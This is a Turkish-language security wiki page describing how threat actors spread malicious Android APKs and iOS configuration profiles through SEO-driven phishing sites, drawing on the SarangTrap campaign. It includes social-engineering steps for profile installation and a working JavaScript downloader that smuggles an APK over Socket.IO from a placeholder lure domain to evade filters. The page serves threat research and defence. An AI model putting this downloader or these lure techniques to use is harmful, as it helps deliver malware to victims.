# Mobile Phishing ve Kötü Amaçlı Uygulama Dağıtımı (Android ve iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Bu sayfada, tehdit aktörlerinin phishing (SEO, sosyal mühendislik, sahte mağazalar, dating uygulamaları vb.) yoluyla **kötü amaçlı Android APK'larını** ve **iOS mobil yapılandırma profillerini** dağıtmak için kullandığı teknikler ele alınmaktadır.
> İçerik, Zimperium zLabs tarafından açığa çıkarılan SarangTrap kampanyasından (2025) ve diğer herkese açık araştırmalardan uyarlanmıştır.<sup>[[1]](#references)</sup>

## Saldırı Akışı

1. **SEO/Phishing Altyapısı**
   * Birbirine benzeyen onlarca alan adı kaydedin (dating, bulut paylaşımı, araç servisi…).
     – Google'da üst sıralarda yer almak için `<title>` öğesinde yerel dilde anahtar kelimeler ve emojiler kullanın.
     – Aynı açılış sayfasında hem Android (`.apk`) hem de iOS yükleme talimatlarını barındırın.
2. **İlk Aşama İndirme**
   * Android: *imzalanmamış* veya “üçüncü taraf mağaza” APK'sına doğrudan bağlantı.
   * iOS: kötü amaçlı bir **mobileconfig** profiline `itms-services://` veya düz HTTPS bağlantısı (aşağıya bakın).
3. **Android Yükleme Sonrası Davranış**
   * C2 kontrollü çalıştırma, izinlerin kötüye kullanılması, dropper atlatma teknikleri, arka planda veri toplama ve diğer yükleme sonrası kötü amaçlı yazılım davranışları aşağıdaki özel Android Malware Post-Exploitation sayfasında ele alınmaktadır.
4. **iOS Dağıtım Tekniği**
   * Tek bir **mobil yapılandırma profili**, cihazı “MDM” benzeri bir denetime kaydetmek için `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyebilir.
   * Sosyal mühendislik talimatları:
     1. Ayarlar'ı açın ➜ *Profil İndirildi*.
     2. *Yükle* seçeneğine üç kez dokunun (phishing sayfasındaki ekran görüntüleriyle).
     3. İmzasız profile güvenin ➜ saldırgan, App Store incelemesinden geçmeden *Kişiler* ve *Fotoğraflar* yetkilerini elde eder.
5. **iOS Web Clip Payload (phishing uygulama simgesi)**
   * `com.apple.webClip.managed` payload'ları, markalı bir simge/etiketle **phishing URL'sini Ana Ekran'a sabitleyebilir**.
   * Web Clip'ler **tam ekran** çalışabilir (tarayıcı arayüzünü gizler) ve **kaldırılamaz** olarak işaretlenebilir; böylece simgeyi kaldırmak için kurbanın profili silmesi gerekir.<sup>[[3]](#references)</sup>
6. **Ağ Katmanı**
   * Düz HTTP; çoğunlukla 80 numaralı portta ve `api.<phishingdomain>.com` gibi bir HOST başlığıyla.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → tespit etmesi kolay).

## Android Malware Post-Exploitation

C2, Accessibility'nin kötüye kullanılması, overlay'ler, ATS otomasyonu, aşamalı DEX yükleme, premium SMS ve kalıcılık gibi yükleme sonrası Android malware teknikleri için bkz.:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket Tabanlı APK Smuggling ve Sahte Google Play Sayfaları

Saldırganlar, statik APK bağlantıları yerine Google Play'i andıran tuzak sayfalarına gömülü Socket.IO/WebSocket kanallarını giderek daha fazla kullanıyor. Bu yöntem payload URL'sini gizler, URL/uzantı filtrelerini atlatır ve gerçekçi bir yükleme deneyimi sunar.<sup>[[2]](#references)[[4]](#references)</sup>

Gerçek saldırılarda gözlemlenen tipik istemci akışı:

<details>
<summary>Sahte Play indiricisi (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Basit kontrolleri neden atlatır:
- Statik bir APK URL’si açığa çıkmaz; payload, WebSocket frame’lerinden bellekte yeniden oluşturulur.
- Doğrudan .apk yanıtlarını engelleyen URL/MIME/uzantı filtreleri, WebSocket/Socket.IO üzerinden tünellenen ikili verileri gözden kaçırabilir.
- WebSocket’leri çalıştırmayan crawler’lar ve URL sandbox’ları payload’ı alamaz.

Ayrıca WebSocket yöntemleri ve araçlarına bakın:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Romantizmin Karanlık Yüzü: SarangTrap Şantaj Kampanyası](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple aygıtları için Web Clips payload ayarları](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Endonezyalı ve Vietnamlı Android kullanıcılarını hedefleyen Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
